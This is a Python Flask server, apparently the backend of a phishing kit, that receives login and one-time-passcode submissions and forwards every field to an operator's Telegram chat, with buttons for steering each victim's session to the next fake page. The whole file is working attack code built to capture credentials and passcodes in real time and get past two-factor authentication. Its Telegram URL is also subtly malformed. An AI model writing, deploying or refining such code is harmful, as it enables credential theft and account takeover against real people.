from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

# ENV - Ensure these are set in Render's Environment tab
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# SESSION STORE
SESSION_STATUS = {}

def send_to_telegram(data, session_id, type_):
    msg = f"🔐 {type_.upper()} Submission\n\n"
    for k, v in data.items():
        msg += f"• {k.upper()} : {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🔐 LOGIN1", "callback_data": f"{session_id}:index.html"}],
            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
        ]
    }

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": json.dumps(keyboard)
    }

    try:
        r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", data=payload, timeout=10)
        return r.ok
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

@app.route("/login", methods=["POST", "OPTIONS"])
def login():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, session_id, "login")
    return jsonify({"success": True, "id": session_id})

@app.route("/otp", methods=["POST", "OPTIONS"])
def otp():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    if not data: return jsonify({"success": False, "error": "No data"}), 400
    
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, session_id, "otp")
    return jsonify({"success": True, "id": session_id})

@app.route("/status/<session_id>")
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    return jsonify(session) if session else (jsonify({"error": "Invalid session"}), 404)

@app.route("/")
def home():
    return "✅ Server is live and connected."

# ✅ DEBUG ERROR HANDLER
@app.errorhandler(500)
def internal_error(error):
    return jsonify({"success": False, "error": "Internal Server Error. Check Render Logs."}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
